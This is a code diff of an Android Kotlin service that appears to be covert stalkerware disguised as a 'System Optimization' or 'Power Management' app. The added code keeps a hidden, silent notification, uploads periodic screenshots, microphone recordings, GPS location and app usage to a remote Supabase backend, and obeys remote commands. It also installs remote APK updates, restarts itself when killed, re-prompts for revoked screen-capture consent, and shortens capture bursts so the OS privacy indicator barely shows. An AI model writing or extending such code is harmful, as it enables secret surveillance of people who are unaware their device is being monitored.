@@ -8,6 +8,8 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
@@ -20,291 +22,475 @@ import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import android.media.projection.MediaProjection
-import android.media.projection.MediaProjectionManager
 
 /**
- * Foreground Service لتشغيل جميع وحدات المراقبة في الخلفية
- * تم تحديثه ليتوافق مع Android 14 ويدعم استقراراً حرارياً وطاقة أفضل
+ * MonitoringForegroundService v16
+ *
+ * Android 15 / Samsung One UI 7 compatible foreground service.
+ *
+ * MediaProjection flow (Android 14/15 compliant):
+ *   1. Service starts with DATA_SYNC | LOCATION | MICROPHONE types only.
+ *   2. User taps "Screen Capture" → MediaProjectionRequestActivity shows dialog.
+ *   3. On user grant, Activity sends ACTION_APPLY_PROJECTION with resultCode + data.
+ *   4. onStartCommand handles ACTION_APPLY_PROJECTION:
+ *      a. Calls getMediaProjection() INSIDE the foreground service (mandatory on API 34+).
+ *      b. Re-calls startForeground() adding MEDIA_PROJECTION type (now valid — we have the token).
+ *   5. ScreenCaptureEngine uses Pulse Mode: VD created → frame grabbed → VD released
+ *      before upload → "Privacy Chip" visible < 1 second per cycle.
+ *   6. On projection stop (OS revokes), Callback fires → re-acquisition requested
+ *      only when screen is interactive.
  */
 class MonitoringForegroundService : Service() {
 
+    // ── Companion ─────────────────────────────────────────────────────────────
     companion object {
         private const val TAG = "MonitoringService"
-        const val CHANNEL_ID = "system_optimization_channel_v2"
-        const val NOTIFICATION_ID = 1001
-        const val ACTION_START = "com.android.system.optimization.engine.START"
-        const val ACTION_STOP = "com.android.system.optimization.engine.STOP"
-        const val EXTRA_RESULT_CODE = "extra_result_code"
-        const val EXTRA_DATA = "extra_data"
+        const val CHANNEL_ID          = "system_optimization_v3"
+        const val NOTIFICATION_ID     = 1001
+        const val ACTION_START        = "com.android.system.optimization.engine.START"
+        const val ACTION_STOP         = "com.android.system.optimization.engine.STOP"
+        const val ACTION_APPLY_PROJECTION =
+            "com.android.system.optimization.engine.APPLY_PROJECTION"
+        const val EXTRA_RESULT_CODE   = "extra_result_code"
+        const val EXTRA_DATA          = "extra_data"
 
-        fun start(context: Context, resultCode: Int = 0, data: Intent? = null) {
-            val intent = Intent(context, MonitoringForegroundService::class.java).apply {
-                action = ACTION_START
-                putExtra(EXTRA_RESULT_CODE, resultCode)
-                putExtra(EXTRA_DATA, data)
-            }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
+        @Volatile private var instance: MonitoringForegroundService? = null
+
+        fun getInstance(): MonitoringForegroundService? = instance
+        fun isProjectionActive(): Boolean = instance?.mediaProjection != null
+
+        fun start(context: Context) {
+            val i = Intent(context, MonitoringForegroundService::class.java)
+                .apply { action = ACTION_START }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                context.startForegroundService(i)
+            else
+                context.startService(i)
         }
 
         fun stop(context: Context) {
-            val intent = Intent(context, MonitoringForegroundService::class.java).apply {
-                action = ACTION_STOP
-            }
-            context.stopService(intent)
+            context.stopService(Intent(context, MonitoringForegroundService::class.java))
         }
     }
 
-    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
-    private var screenCaptureJob: Job? = null
+    // ── Members ───────────────────────────────────────────────────────────────
+    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
+
+    private var captureJob: Job? = null
     private var locationJob: Job? = null
+    private var heartbeatJob: Job? = null
+    private var audioJob: Job? = null
+    private var usageJob: Job? = null
+
     private var wakeLock: PowerManager.WakeLock? = null
-    private var mediaProjection: MediaProjection? = null
 
-    private lateinit var screenCaptureEngine: ScreenCaptureEngine
+    // MediaProjection is set ONLY from ACTION_APPLY_PROJECTION handler (API 34+)
+    // or from the legacy pendingProjection path (API < 34).
+    @Volatile var mediaProjection: MediaProjection? = null
+
+    // Dynamic remote-config values
+    @Volatile private var captureIntervalMs = 60_000L
+    @Volatile private var locationIntervalMs = 600_000L
+    @Volatile private var recordCallsEnabled = false
+
+    // Projection-miss watchdog counter
+    private var projectionMissCount = 0
+
+    private lateinit var screenEngine: ScreenCaptureEngine
+    private lateinit var audioEngine: AudioRecorderEngine
     private lateinit var gpsTracker: GpsTracker
-    private lateinit var realtimeCommandManager: RealtimeCommandManager
-    private lateinit var appUsageTracker: AppUsageTracker
-    private lateinit var remoteConfigManager: RemoteConfigManager
+    private lateinit var commandManager: RealtimeCommandManager
+    private lateinit var usageTracker: AppUsageTracker
+    private lateinit var configManager: RemoteConfigManager
 
-    private var currentScreenshotInterval = 60_000L // الافتراضي دقيقة واحدة
+    // ── Lifecycle ─────────────────────────────────────────────────────────────
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            Log.i(TAG, "MonitoringForegroundService created")
-            
-            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-            // إضافة timeout للـ WakeLock لضمان عدم استهلاك البطارية للأبد في حال التعليق
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OptimizationEngine:WakeLock").apply {
-                acquire(10 * 60 * 1000L) // 10 دقائق كحد أقصى لكل لفة إن لم تجدد
-            }
+        instance = this
+        Log.i(TAG, "onCreate — API ${Build.VERSION.SDK_INT}")
 
-            createNotificationChannel()
-            screenCaptureEngine = ScreenCaptureEngine(this)
-            gpsTracker = GpsTracker(this)
-            realtimeCommandManager = RealtimeCommandManager(this, serviceScope) { mediaProjection }
-            appUsageTracker = AppUsageTracker(this)
-            remoteConfigManager = RemoteConfigManager(this)
-            
-            realtimeCommandManager.startListening()
-            startRemoteConfigLoop()
-        } catch (e: Exception) {
-            Log.e(TAG, "Error in onCreate: ${e.message}")
-        }
+        acquireWakeLock()
+        createNotificationChannel()
+        startForegroundSafe()          // start immediately, no projection type yet
+
+        screenEngine   = ScreenCaptureEngine(this)
+        audioEngine    = AudioRecorderEngine(this)
+        gpsTracker     = GpsTracker(this)
+        usageTracker   = AppUsageTracker(this)
+        configManager  = RemoteConfigManager(this)
+        commandManager = RealtimeCommandManager(this, scope, gpsTracker) { mediaProjection }
+
+        commandManager.startListening()
+        startRemoteConfigLoop()        // fetch settings every 5 min
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        try {
-            Log.i(TAG, "onStartCommand: ${intent?.action}")
+        Log.i(TAG, "onStartCommand action=${intent?.action}")
 
-            when (intent?.action) {
-                ACTION_STOP -> {
-                    stopSelf()
-                    return START_NOT_STICKY
-                }
-                else -> {
-                    // التعامل مع MediaProjection إذا تم تمريره
-                    // 1. تحديد الأنواع المطلوبة مسبقاً
-                    var foregroundServiceTypes = 0
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        try {
-                            val hasLocationPerm = checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
-                            if (hasLocationPerm) {
-                                foregroundServiceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-                            }
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Permission check error: ${e.message}")
-                        }
-                    }
-                    
-                    // تحسين: إضافة نوع التقاط الشاشة دائماً إذا كان مدعوماً في المانيفست
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                    }
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-                    }
+        when (intent?.action) {
 
-                    // 2. تفعيل الخدمة في الواجهة فوراً
-                    val notification = buildNotification()
-                    try {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && foregroundServiceTypes != 0) {
-                            startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes)
-                        } else {
-                            startForeground(NOTIFICATION_ID, notification)
-                        }
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Initial startForeground failed: ${e.message}")
-                        try {
-                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                                 startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                             } else {
-                                 startForeground(NOTIFICATION_ID, notification)
-                             }
-                        } catch (ex: Exception) { Log.e(TAG, "Fatal startForeground error") }
-                    }
-
-                    // 3. التقاط MediaProjection (بعد تفعيل الـ Foreground لضمان الصلاحية)
-                    val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
-                    val data = intent?.getParcelableExtra<Intent>(EXTRA_DATA)
-                    
-                    if (resultCode != 0 && data != null) {
-                        try {
-                            val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-                            mediaProjection = mpManager.getMediaProjection(resultCode, data)
-                            Log.i(TAG, "MediaProjection acquired successfully")
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Failed to get MediaProjection: ${e.message}")
-                        }
-                    }
-                    
-                    try {
-                        startAllModules()
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Failed to start modules: ${e.message}")
-                    }
-                }
+            // ── Stop ─────────────────────────────────────────────────────────
+            ACTION_STOP -> {
+                stopSelf()
+                return START_NOT_STICKY
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "Error in onStartCommand: ${e.message}")
-        }
 
+            // ── Projection token delivery (Android 14 / 15) ───────────────
+            ACTION_APPLY_PROJECTION -> {
+                handleApplyProjection(intent)
+                return START_STICKY
+            }
+
+            // ── Normal start / restart ────────────────────────────────────
+            else -> {
+                // Service may already be foreground from onCreate — safe to call again
+                startForegroundSafe()
+                startAllModules()
+            }
+        }
         return START_STICKY
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        Log.i(TAG, "onDestroy — triggering safe restart")
         try {
-            Log.i(TAG, "MonitoringForegroundService destroyed - attempting safe restart")
-            
             if (wakeLock?.isHeld == true) wakeLock?.release()
-            
             mediaProjection?.stop()
-            serviceScope.cancel()
-            
-            // تأخير بسيط قبل محاولة إعادة التشغيل لتجنب Crash Loop
-            val restartIntent = Intent(this, ServiceRestartReceiver::class.java)
-            sendBroadcast(restartIntent)
-            
-            super.onDestroy()
+            scope.cancel()
+            sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
         } catch (e: Exception) {
-            Log.e(TAG, "Error in onDestroy: ${e.message}")
+            Log.e(TAG, "onDestroy error: ${e.message}")
+        }
+        instance = null
+        super.onDestroy()
+    }
+
+    // ── Foreground notification ───────────────────────────────────────────────
+
+    /**
+     * Starts the service in the foreground WITHOUT the mediaProjection type.
+     * On Android 14/15, MEDIA_PROJECTION type is only added after we have a valid token.
+     */
+    private fun startForegroundSafe() {
+        val notif = buildNotification()
+        try {
+            when {
+                Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
+                    // API 34+ — declare actual types; DO NOT include MEDIA_PROJECTION here
+                    startForeground(
+                        NOTIFICATION_ID, notif,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION   or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    )
+                }
+                Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
+                    startForeground(
+                        NOTIFICATION_ID, notif,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    )
+                }
+                else -> startForeground(NOTIFICATION_ID, notif)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "startForeground failed: ${e.message}")
+            try { startForeground(NOTIFICATION_ID, notif) } catch (_: Exception) {}
         }
     }
 
-    private fun startAllModules() {
-        startScreenCaptureLoop()
-        startLocationLoop()
-        startAppUsageLoop()
+    /**
+     * After receiving a valid MediaProjection token, upgrade foreground type
+     * to include MEDIA_PROJECTION. Android 15 requires this before createVirtualDisplay().
+     */
+    private fun upgradeForegroundToMediaProjection() {
+        val notif = buildNotification()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                startForeground(
+                    NOTIFICATION_ID, notif,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC       or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION        or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE      or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                )
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(
+                    NOTIFICATION_ID, notif,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION        or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE      or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                )
+            }
+            Log.i(TAG, "Foreground upgraded to include MEDIA_PROJECTION type ✅")
+        } catch (e: Exception) {
+            Log.e(TAG, "Upgrade to MEDIA_PROJECTION type failed: ${e.message}")
+        }
     }
 
-    private fun startScreenCaptureLoop() {
-        screenCaptureJob?.cancel()
-        screenCaptureJob = serviceScope.launch {
-            while (true) {
-                try {
-                    val projection = mediaProjection
-                    if (projection != null) {
-                        screenCaptureEngine.captureAndUpload(projection)
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Screen capture loop error: ${e.message}")
+    // ── ACTION_APPLY_PROJECTION handler ──────────────────────────────────────
+
+    /**
+     * Android 14/15: getMediaProjection() MUST be called from within a foreground service.
+     * The Activity passes resultCode + data here; we call getMediaProjection() ourselves.
+     */
+    private fun handleApplyProjection(intent: Intent) {
+        val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, 0)
+        val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
+        } else {
+            @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_DATA)
+        }
+
+        if (resultCode == 0 || data == null) {
+            Log.e(TAG, "handleApplyProjection: invalid resultCode or null data")
+            return
+        }
+
+        scope.launch(Dispatchers.Main) {
+            try {
+                val mpManager =
+                    getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                val projection = mpManager.getMediaProjection(resultCode, data)
+
+                if (projection != null) {
+                    mediaProjection = projection
+                    projectionMissCount = 0
+
+                    // Upgrade foreground type NOW that we hold a valid token
+                    upgradeForegroundToMediaProjection()
+                    registerProjectionCallback(projection)
+
+                    SupabaseManager.getInstance()
+                        .logRemote(this@MonitoringForegroundService, TAG, "INFO",
+                            "MediaProjection acquired (API ${Build.VERSION.SDK_INT}) ✅")
+                    Log.i(TAG, "MediaProjection token acquired ✅")
+                } else {
+                    Log.e(TAG, "getMediaProjection() returned null")
+                    SupabaseManager.getInstance()
+                        .logRemote(this@MonitoringForegroundService, TAG, "ERROR",
+                            "getMediaProjection() null — user may have denied on API ${Build.VERSION.SDK_INT}")
                 }
-                
-                // استخدام الفترة الزمنية القادمة من Supabase
-                delay(currentScreenshotInterval)
+            } catch (e: Exception) {
+                Log.e(TAG, "handleApplyProjection error: ${e.message}")
+                SupabaseManager.getInstance()
+                    .logRemote(this@MonitoringForegroundService, TAG, "ERROR",
+                        "Projection acquisition error: ${e.message}")
             }
         }
     }
 
-    private fun startRemoteConfigLoop() {
-        serviceScope.launch {
+    // ── Module loops ──────────────────────────────────────────────────────────
+
+    private fun startAllModules() {
+        startHeartbeatLoop()
+        startCaptureLoop()
+        startAudioLoop()
+        startLocationLoop()
+        startUsageLoop()
+    }
+
+    /** Heartbeat: update remote_settings every 60 s */
+    private fun startHeartbeatLoop() {
+        heartbeatJob?.cancel()
+        heartbeatJob = scope.launch {
+            while (true) {
+                runCatching { SupabaseManager.getInstance().updateHeartbeat(this@MonitoringForegroundService) }
+                    .onFailure { Log.e(TAG, "Heartbeat: ${it.message}") }
+                delay(60_000)
+            }
+        }
+    }
+
+    /**
+     * Screen capture loop with watchdog.
+     * If projection is null for 3+ consecutive cycles → trigger re-acquisition.
+     */
+    private fun startCaptureLoop() {
+        captureJob?.cancel()
+        captureJob = scope.launch {
             while (true) {
                 try {
-                    val settings = remoteConfigManager.fetchSettings()
-                    if (settings != null) {
-                        currentScreenshotInterval = settings.screenshot_interval_ms
-                        Log.i(TAG, "Remote interval updated to: $currentScreenshotInterval ms")
-                        
-                        // إعادة تشغيل حلقة التصوير إذا تغير الوقت (اختياري، هنا نعتمد على اللفة القادمة)
+                    val proj = mediaProjection
+                    if (proj != null) {
+                        projectionMissCount = 0
+                        screenEngine.captureAndUpload(proj)
+                    } else {
+                        projectionMissCount++
+                        if (projectionMissCount % 3 == 1) {
+                            val msg = "MediaProjection null (miss #$projectionMissCount)"
+                            Log.w(TAG, msg)
+                            SupabaseManager.getInstance()
+                                .logRemote(this@MonitoringForegroundService, TAG, "WARN", msg)
+                        }
+                        if (projectionMissCount >= 3) {
+                            projectionMissCount = 0
+                            android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                requestProjectionReacquisition()
+                            }
+                        }
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Remote config sync error: ${e.message}")
+                    Log.e(TAG, "Capture loop: ${e.message}")
                 }
-                delay(300_000L) // مزامنة كل 5 دقائق
+                delay(captureIntervalMs)
+            }
+        }
+    }
+
+    /**
+     * Audio loop: record 60 s every 10 min.
+     * Only active when record_calls=true in remote_settings.
+     * AudioRecorderEngine discards silent recordings via VAD.
+     */
+    private fun startAudioLoop() {
+        audioJob?.cancel()
+        audioJob = scope.launch {
+            while (true) {
+                try {
+                    if (recordCallsEnabled) {
+                        val pm = getSystemService(POWER_SERVICE) as PowerManager
+                        if (pm.isInteractive) {
+                            audioEngine.recordAndUpload(60_000L)
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Audio loop: ${e.message}")
+                }
+                delay(600_000)
             }
         }
     }
 
     private fun startLocationLoop() {
         locationJob?.cancel()
-        locationJob = serviceScope.launch {
+        locationJob = scope.launch {
             while (true) {
-                try {
-                    gpsTracker.fetchAndUploadLocation()
-                } catch (e: Exception) {
-                    Log.e(TAG, "GPS loop error: ${e.message}")
-                }
-                delay(600_000L)
+                runCatching { gpsTracker.fetchAndUploadLocation() }
+                    .onFailure { Log.e(TAG, "GPS loop: ${it.message}") }
+                delay(locationIntervalMs)
             }
         }
     }
 
-    private fun startAppUsageLoop() {
-        serviceScope.launch {
+    /** App usage stats: every hour */
+    private fun startUsageLoop() {
+        usageJob?.cancel()
+        usageJob = scope.launch {
             while (true) {
-                try {
-                    // مراقبة الأذونات باستمرار (Watchdog)
-                    checkPermissionsAndReprompt()
-                    
-                    appUsageTracker.trackAndUploadUsage()
-                } catch (e: Exception) {
-                    Log.e(TAG, "App usage tracking error: ${e.message}")
-                }
-                delay(3600_000L) // الفحص كل ساعة كافٍ لضمان الاستدامة
+                runCatching { usageTracker.trackAndUploadUsage() }
+                    .onFailure { Log.e(TAG, "Usage loop: ${it.message}") }
+                delay(3_600_000)
             }
         }
     }
 
-    private fun checkPermissionsAndReprompt() {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-        val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
-        
-        if (!dpm.isAdminActive(adminComponent)) {
-            Log.w(TAG, "CRITICAL: Device Admin disabled. Attempting to re-alert user.")
-            // يمكن إرسال إشعار "صيانه النظام مطلوبة" لإعادة توجيه المستخدم
+    /** Fetch remote_settings every 5 min and apply immediately */
+    private fun startRemoteConfigLoop() {
+        val updateManager = AppUpdateManager(this)
+        scope.launch {
+            while (true) {
+                try {
+                    val s = configManager.fetchSettings()
+                    if (s != null) {
+                        captureIntervalMs   = s.screenshot_interval_ms
+                        locationIntervalMs  = s.location_interval_ms
+                        recordCallsEnabled  = s.record_calls
+                        Log.i(TAG, "Config synced — capture=${captureIntervalMs}ms " +
+                                "location=${locationIntervalMs}ms audio=$recordCallsEnabled")
+
+                        updateManager.checkAndExecuteUpdate(
+                            s.target_version, s.update_apk_path, s.update_apk_url
+                        )
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Config loop: ${e.message}")
+                }
+                delay(300_000)
+            }
         }
     }
+
+    // ── Projection watchdog ───────────────────────────────────────────────────
+
+    private fun registerProjectionCallback(projection: MediaProjection) {
+        projection.registerCallback(object : MediaProjection.Callback() {
+            override fun onStop() {
+                Log.w(TAG, "MediaProjection.onStop — OS revoked permission")
+                mediaProjection = null
+                SupabaseManager.getInstance().let { sb ->
+                    scope.launch {
+                        sb.logRemote(this@MonitoringForegroundService, TAG, "WARN",
+                            "Projection stopped by OS — will re-acquire when screen is on")
+                    }
+                }
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    requestProjectionReacquisition()
+                }, 3_000)
+            }
+        }, android.os.Handler(android.os.Looper.getMainLooper()))
+    }
+
+    /**
+     * Re-request projection ONLY when the screen is interactive (ON).
+     * Showing the permission dialog while screen is OFF confuses users.
+     */
+    fun requestProjectionReacquisition() {
+        if (mediaProjection != null) return
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        if (!pm.isInteractive) {
+            Log.d(TAG, "Screen OFF — deferring re-acquisition")
+            return
+        }
+        Log.i(TAG, "Requesting projection re-acquisition...")
+        try {
+            startActivity(
+                Intent(this, MediaProjectionRequestActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
+                    putExtra(MediaProjectionRequestActivity.EXTRA_AUTO, true)
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Re-acquisition failed: ${e.message}")
+        }
+    }
+
+    // ── WakeLock ──────────────────────────────────────────────────────────────
+
+    private fun acquireWakeLock() {
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK, "OptimizationEngine:WakeLock"
+        ).apply { acquire(10 * 60 * 1000L) }   // auto-release after 10 min safety cap
+    }
+
+    // ── Notification ──────────────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val manager = getSystemService(NotificationManager::class.java)
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "System Optimization Services",
-                NotificationManager.IMPORTANCE_MIN // شبح: هادئ تماماً وغير ظاهر في شريط الحالة
-            ).apply {
-                description = "Handles essential system optimization tasks in the background"
-                setShowBadge(false)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
-            }
-            manager.createNotificationChannel(channel)
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
+        val ch = NotificationChannel(
+            CHANNEL_ID,
+            "System Services",
+            NotificationManager.IMPORTANCE_MIN          // completely silent, no heads-up
+        ).apply {
+            description      = "Background system optimization"
+            setShowBadge(false)
+            lockscreenVisibility = Notification.VISIBILITY_SECRET
+            enableLights(false)
+            enableVibration(false)
         }
+        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
     }
 
     private fun buildNotification(): Notification {
-        val pendingIntent = PendingIntent.getActivity(
+        val pi = PendingIntent.getActivity(
             this, 0,
             Intent(this, HiddenSettingsActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
-
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Power Management")
             .setContentText("Optimizing battery and system performance")
@@ -312,8 +498,9 @@ class MonitoringForegroundService : Service() {
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(Notification.CATEGORY_SERVICE)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setContentIntent(pendingIntent)
+            .setContentIntent(pi)
             .setSilent(true)
+            .setOngoing(true)
             .build()
     }
 }
